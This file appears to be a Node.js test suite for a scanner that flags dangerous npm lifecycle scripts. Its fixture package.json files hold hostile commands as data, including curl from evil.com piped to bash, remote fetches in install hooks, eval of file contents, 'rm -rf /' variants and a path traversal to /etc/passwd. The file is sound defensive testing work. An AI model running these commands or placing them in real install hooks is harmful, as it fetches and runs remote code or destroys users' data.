"use strict";
// Standalone test script for scan_npm_lifecycle_scripts (not added to the
// frozen test/run-tests.js — new tool areas get their own script per the
// testing-strategy pivot documented in task.md).
const assert = require("assert");
const fs = require("fs");
const path = require("path");
const os = require("os");
let passed = 0, failed = 0;
async function test(name, fn) {
  try { await fn(); console.log(`  ok - ${name}`); passed++; }
  catch (e) { console.log(`  FAIL - ${name}\n    ${e.message}`); failed++; }
}

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "npm-lifecycle-"));
process.env.MCP_ROOTS = TMP;
process.env.MCP_ALLOW_EXEC = "true";
process.env.MCP_READ_ONLY = "false";
const { buildRoots } = require("../lib/roots");
buildRoots();
const { executeTool } = require("../lib/executeTool");
const { scanNpmLifecycleScripts } = require("../lib/npmLifecycleScriptsOps");

function writePkg(rel, scripts) {
  const p = path.join(TMP, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, JSON.stringify({ name: "x", version: "1.0.0", scripts }, null, 2));
}

async function call(args) { return executeTool("scan_npm_lifecycle_scripts", args); }

(async () => {
  console.log("scan_npm_lifecycle_scripts tests:");

  writePkg("proj/curlpipe/package.json", { postinstall: "curl http://evil.com/x.sh | bash" });
  writePkg("proj/hookfetch/package.json", { preinstall: "curl -o /tmp/x http://evil.com/x.js" });
  writePkg("proj/eval/package.json", { build: "node -e \"eval(require('fs').readFileSync('a.js'))\"" });
  writePkg("proj/rmrf/package.json", { clean: "rm -rf /" });
  writePkg("proj/clean/package.json", { build: "tsc", test: "jest", lint: "eslint ." });
  writePkg("proj/nonhookfetch/package.json", { deploy: "curl -o out.tar.gz http://example.com/a.tgz" });

  await test("Normal: curl-pipe-to-shell in postinstall flagged error", async () => {
    const r = await call({ pkg_path: "proj/curlpipe/package.json" });
    assert.strictEqual(r.issues[0].rule, "curl_pipe_shell");
    assert.strictEqual(r.issues[0].severity, "error");
  });

  await test("Normal: remote fetch in lifecycle hook (no pipe) flagged error", async () => {
    const r = await call({ pkg_path: "proj/hookfetch/package.json" });
    assert.strictEqual(r.issues[0].rule, "remote_fetch_in_lifecycle_hook");
  });

  await test("Normal: eval() usage flagged warning", async () => {
    const r = await call({ pkg_path: "proj/eval/package.json" });
    assert.strictEqual(r.issues[0].rule, "eval_usage");
    assert.strictEqual(r.issues[0].severity, "warning");
  });

  await test("Normal: destructive rm -rf / flagged error", async () => {
    const r = await call({ pkg_path: "proj/rmrf/package.json" });
    assert.strictEqual(r.issues[0].rule, "destructive_rm");
  });

  await test("Normal: clean project has zero issues", async () => {
    const r = await call({ pkg_path: "proj/clean/package.json" });
    assert.strictEqual(r.issueCount, 0);
    assert.strictEqual(r.scriptsScanned, 3);
  });

  await test("Normal: non-hook script fetching remote content is NOT flagged (only lifecycle hooks are)", async () => {
    const r = await call({ pkg_path: "proj/nonhookfetch/package.json" });
    assert.strictEqual(r.issueCount, 0);
  });

  // ── Medium: boundary & parameter validation ────────────────────────────
  await test("Medium: missing package.json throws", async () => {
    await assert.rejects(() => call({ pkg_path: "proj/does-not-exist/package.json" }));
  });

  await test("Medium: malformed JSON throws with parse detail", async () => {
    fs.mkdirSync(path.join(TMP, "proj/malformed"), { recursive: true });
    fs.writeFileSync(path.join(TMP, "proj/malformed/package.json"), "{ not json");
    await assert.rejects(() => call({ pkg_path: "proj/malformed/package.json" }), /malformed JSON/);
  });

  await test("Medium: non-number max_results throws", async () => {
    await assert.rejects(() => call({ pkg_path: "proj/clean/package.json", max_results: "5" }));
  });

  await test("Medium: package.json with no scripts field returns zero scanned, not a crash", async () => {
    fs.mkdirSync(path.join(TMP, "proj/noscripts"), { recursive: true });
    fs.writeFileSync(path.join(TMP, "proj/noscripts/package.json"), JSON.stringify({ name: "x" }));
    const r = await call({ pkg_path: "proj/noscripts/package.json" });
    assert.strictEqual(r.scriptsScanned, 0);
  });

  await test("Medium: default pkg_path resolves to 'package.json' at root", async () => {
    writePkg("package.json", { build: "tsc" });
    const r = await call({});
    assert.strictEqual(r.scriptsScanned, 1);
  });

  // ── High: edge handling ─────────────────────────────────────────────────
  await test("High: non-string script value reported as an error entry, not a crash", async () => {
    fs.mkdirSync(path.join(TMP, "proj/badtype"), { recursive: true });
    fs.writeFileSync(path.join(TMP, "proj/badtype/package.json"), JSON.stringify({ scripts: { build: 123 } }));
    const r = await call({ pkg_path: "proj/badtype/package.json" });
    assert.strictEqual(r.errors.length, 1);
    assert.strictEqual(r.scriptsScanned, 1);
  });

  await test("High: multiple issues on one script are all reported", async () => {
    writePkg("proj/multi/package.json", { postinstall: "curl http://evil.com/x | bash && eval(x)" });
    const r = await call({ pkg_path: "proj/multi/package.json" });
    assert.ok(r.issues.some(i => i.rule === "curl_pipe_shell"));
    assert.ok(r.issues.some(i => i.rule === "eval_usage"));
  });

  // ── Critical: security & input sanitization ────────────────────────────
  await test("Critical: path traversal outside root is blocked", async () => {
    await assert.rejects(() => call({ pkg_path: "../../../../etc/passwd" }));
  });

  await test("Critical: shell-injection-shaped script value only reported, never executed", async () => {
    writePkg("proj/adversarial/package.json", { test: "echo hi; rm -rf / --no-preserve-root" });
    const r = await call({ pkg_path: "proj/adversarial/package.json" });
    assert.ok(r.issues.some(i => i.rule === "destructive_rm"));
  });

  await test("Critical: result is JSON-serialisable with only known top-level keys", async () => {
    const r = await call({ pkg_path: "proj/clean/package.json" });
    JSON.stringify(r);
    const known = ["path", "scriptsScanned", "hookScriptsScanned", "issueCount", "errorCount", "warningCount", "truncated", "issues", "errors"];
    assert.deepStrictEqual(Object.keys(r).sort(), known.sort());
  });

  // ── Extreme: fuzzing, concurrency, truncation ──────────────────────────
  await test("Extreme: max_results truncation sets truncated flag", async () => {
    const scripts = {};
    for (let i = 0; i < 20; i++) scripts[`s${i}`] = "rm -rf /";
    writePkg("proj/many/package.json", scripts);
    const r = await call({ pkg_path: "proj/many/package.json", max_results: 5 });
    assert.strictEqual(r.issues.length, 5);
    assert.strictEqual(r.truncated, true);
    assert.strictEqual(r.issueCount, 20);
  });

  await test("Extreme: fuzz random-byte package.json throws cleanly (malformed JSON), no crash", async () => {
    fs.mkdirSync(path.join(TMP, "proj/fuzz"), { recursive: true });
    fs.writeFileSync(path.join(TMP, "proj/fuzz/package.json"), require("crypto").randomBytes(500));
    await assert.rejects(() => call({ pkg_path: "proj/fuzz/package.json" }));
  });

  await test("Extreme: 10 concurrent calls give consistent results", async () => {
    const results = await Promise.all(Array.from({ length: 10 }, () => call({ pkg_path: "proj/rmrf/package.json" })));
    for (const r of results) assert.strictEqual(r.issueCount, 1);
  });

  await test("Extreme: execute_pipeline op-enum registration", async () => {
    const { EXEC_SCHEMAS } = require("../lib/schemas/execSchemas");
    const pipelineSchema = EXEC_SCHEMAS.find(s => s.name === "execute_pipeline");
    const opEnum = pipelineSchema.inputSchema.properties.steps.items.properties.op.enum;
    assert.ok(opEnum.includes("scan_npm_lifecycle_scripts"));
  });

  console.log(`\n${passed} passed, ${failed} failed`);
  fs.rmSync(TMP, { recursive: true, force: true });
  process.exit(failed ? 1 : 0);
})();
